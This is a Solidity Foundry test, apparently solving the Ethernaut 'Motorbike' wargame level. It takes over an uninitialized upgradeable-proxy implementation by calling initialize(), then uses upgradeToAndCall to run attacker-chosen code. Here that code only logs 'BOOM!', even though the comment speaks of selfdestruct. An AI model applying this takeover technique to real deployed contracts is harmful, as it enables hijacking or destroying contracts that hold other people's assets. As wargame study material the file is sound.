// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Engine.sol";
import "../src/Motorbike.sol";

contract TestAttack  is Test {

    Engine engine;
    Motorbike motor;
    
    function setUp() public {
        engine = new Engine();
        motor = new Motorbike(address(engine));
    }

    // Demonstrate that we can selfdestruct implementation contract 
    function testShow() public {
        console.log("msg.sender:          ", msg.sender);
        console.log("TestAttack contract: ", address(this));
        console.log("Motor contract:      ", address(motor));
        console.log("Engine contract:     ", address(engine));

        bytes memory callUpgrader  = abi.encodeWithSignature("upgrader()");
        (bool success, bytes memory returnData) = address(motor).call(callUpgrader);
        require(success, "Failed: upgrader()");

        console.log("================= Before =================");
        console.log("Motor  | upgrader:  ", address(uint160(uint256(vm.parseBytes32((vm.toString(returnData)))))));
        console.log("Engine | upgrader:  ", engine.upgrader());

        vm.prank(msg.sender);
        engine.initialize();

        (success, returnData) = address(motor).call(callUpgrader);
        require(success, "Failed: upgrader()");

        console.log("================= After  =================");
        console.log("Motor  | upgrader:  ", address(uint160(uint256(vm.parseBytes32((vm.toString(returnData)))))));
        console.log("Engine | upgrader:  ", engine.upgrader());

        vm.prank(msg.sender);
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("boom()"));
    }

    function boom() public view {
        console.log("BOOM!");
    }
}